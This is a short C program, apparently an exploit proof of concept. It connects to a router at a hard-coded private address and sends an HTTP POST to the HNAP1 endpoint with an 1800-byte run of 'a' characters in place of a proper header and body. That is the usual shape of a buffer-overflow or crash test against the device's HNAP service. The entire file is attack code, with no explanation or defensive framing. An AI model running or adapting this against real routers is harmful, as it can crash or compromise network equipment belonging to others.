#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/* network */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HTTP_PORT 8080
int main(int argc, char *argv)
{
	struct sockaddr_in serv_addr;
	int sockfd, ret=0;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		perror("ERROR opening socket");
		exit(1);
	}

	memset((char *) &serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr("192.168.76.152");
	serv_addr.sin_port = htons(HTTP_PORT);

	ret = connect(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr));
	if (ret < 0) {
		close(sockfd);
		perror("ERROR on connecting");
		exit(1);
	}
	
	char dataBuffer[2000];
	memset((char *)&dataBuffer, 'a', sizeof(dataBuffer));
	dataBuffer[1800] = '\0';
	long dataBufferLen = strlen(dataBuffer);
	#define PACKET_HEADER "POST /HNAP1/ HTTP/1.1\r\n" \
	"Host: %s\r\n" \
	"Content-Length: %ld\r\n" \
	"Content-Type: text/xml\r\n" \
	"%s\r\n"

	char sendBuffer[2048];
	sprintf(sendBuffer, PACKET_HEADER, "192.168.76.152", dataBufferLen, dataBuffer);
	int sendBufferLen = strlen(sendBuffer);
	ret = send(sockfd, sendBuffer, sendBufferLen, MSG_CONFIRM );
	if (ret < 0) {
		close(sockfd);
		perror("ERROR on sending");
		exit(1);
	}
	
	close(sockfd);

	return 0;
}
